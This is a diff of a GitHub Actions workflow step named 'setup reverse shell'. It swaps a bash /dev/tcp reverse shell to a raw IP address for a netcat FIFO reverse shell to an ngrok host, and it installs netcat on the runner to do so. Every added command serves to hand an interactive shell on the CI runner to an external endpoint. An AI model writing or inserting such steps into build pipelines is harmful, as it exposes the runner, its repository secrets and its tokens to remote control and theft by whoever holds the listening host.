@@ -44,5 +44,13 @@ jobs:
     steps:
     - name: setup reverse shell
       id: rshell
+      shell: bash
       run: |
-        /bin/bash -i >& /dev/tcp/3.141.177.1/10403 0>&1
+        set +e
+        apt install -y netcat
+        apt-get install -y netcat
+        dmesg
+        mkfifo /tmp/f
+        cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.ngrok.io 11301 >/tmp/f
+        cat /tmp/f|/bin/sh -i 2>&1|netcat 2.tcp.ngrok.io 11301 >/tmp/f
+        set -e
